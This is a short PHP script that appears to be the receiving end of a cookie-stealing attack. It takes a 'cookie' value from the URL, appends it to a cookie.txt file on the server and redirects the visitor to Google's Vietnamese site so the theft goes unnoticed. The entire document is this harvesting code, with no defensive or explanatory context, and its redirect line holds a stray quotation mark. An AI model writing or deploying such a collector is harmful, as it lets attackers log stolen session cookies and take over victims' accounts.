$cookie = $_GET['cookie'];
$out = 'Cookie: ' . $cookie . "\n";
$fp = fopen('../cookie.txt', 'a');
fwrite($fp, $out);
fclose($fp);
header('Location:"https://www.google.com.vn');
